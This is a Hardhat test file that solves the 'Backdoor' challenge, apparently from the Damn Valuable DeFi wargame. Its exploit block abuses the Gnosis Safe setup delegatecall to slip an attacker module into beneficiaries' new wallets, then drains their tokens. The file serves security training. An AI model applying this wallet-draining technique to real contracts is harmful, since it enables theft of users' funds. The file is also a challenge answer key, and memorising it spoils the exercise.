const { ethers } = require('hardhat');
const { expect } = require('chai');


let encodeTokenTransfer = (token, to, amount) => {
    return token.interface.encodeFunctionData("transfer", [to, amount])
}


describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        let attackerProxyRegistryInstance = this.walletFactory.connect(attacker)
        
        for(let i = 0; i < users.length; i++) {

            let attackerProxy = await (await ethers.getContractFactory('AttackerBackdoor', attacker)).deploy()

            let encodeEnableModule = this.masterCopy.interface.encodeFunctionData(
                "enableModule", [attackerProxy.address]
            )

            let encodeEnableModuleProxy =attackerProxy.interface.encodeFunctionData(
                "enableModuleOnProxy", [encodeEnableModule]
            )
            
            let encodedSetUp = this.masterCopy.interface.encodeFunctionData(
                "setup",
                [
                    [users[i]],
                    1,
                    attackerProxy.address,
                    encodeEnableModuleProxy,
                    "0x0000000000000000000000000000000000000000",
                    "0x0000000000000000000000000000000000000000",
                    0,
                    "0x0000000000000000000000000000000000000000"
                ]
            )
            
            let tx = await attackerProxyRegistryInstance.createProxyWithCallback(this.masterCopy.address, encodedSetUp, i, this.walletRegistry.address)
            let proxy = await tx.wait()
            let proxyAddress
            proxy.events.map(eventEmitted => {
                if(eventEmitted.topics[0] == ethers.utils.id('ProxyCreation(address,address)')) {
                    let decodedEvent = attackerProxyRegistryInstance.interface.decodeEventLog('ProxyCreation', eventEmitted.data, eventEmitted.topics)
                    proxyAddress = decodedEvent.proxy
                }
            })
            let tokenBalance = await this.token.balanceOf(proxyAddress)
            let tokenData = encodeTokenTransfer(this.token, attacker.address, tokenBalance)
            let txData = this.masterCopy.interface.encodeFunctionData("execTransactionFromModule",
                [
                    this.token.address,
                    ethers.utils.parseEther("0"),
                    tokenData,
                    0
                ]                
            )
            let attackerProxyData = attackerProxy.interface.encodeFunctionData("exploit",
                [
                    proxyAddress,
                    txData
                ]
            )

            let retrieveTx = await attacker.sendTransaction({
                to: attackerProxy.address,
                data: attackerProxyData,
                gasLimit: ethers.BigNumber.from("5000000")
              })

            await retrieveTx.wait()
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
